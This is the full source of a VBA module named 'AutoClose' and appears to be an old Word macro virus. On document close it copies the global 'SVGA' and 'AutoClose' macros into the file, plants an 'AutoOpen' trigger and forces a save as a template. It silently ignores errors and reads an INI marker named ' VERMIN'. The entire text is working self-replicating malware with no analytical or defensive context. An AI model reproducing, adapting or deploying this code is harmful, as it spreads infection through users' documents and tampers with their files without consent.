   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim ParaMacro$
   Dim WOpen$
   Dim yesno
   Dim Dialogues As Object: Set Dialogues = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo No
       WordBasic.CurValues.FileSaveAs Dialogues

       If Dialogues.Format = 0 Then Dialogues.Format = 1

       ParaMacro$ = WordBasic.[FileName$]() + ":AutoOpen"
       WordBasic.MacroCopy "Global:SVGA", ParaMacro$
       ParaMacro$ = WordBasic.[FileName$]() + ":SVGA"
       WordBasic.MacroCopy "Global:SVGA", ParaMacro$
       ParaMacro$ = WordBasic.[FileName$]() + ":AutoClose"
       WordBasic.MacroCopy "Global:AutoClose", ParaMacro$
       WordBasic.FileSaveAs Dialogues
       GoTo Yes
   No:
       If Err.Number <> 102 Then
   WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " VERMIN", "WINWORD6.INI")
   yesno = WordBasic.Val(WOpen$)
   If Not yesno Then
       WordBasic.FileSaveAs Dialogues
   End If
       End If
   Yes:
   End Sub
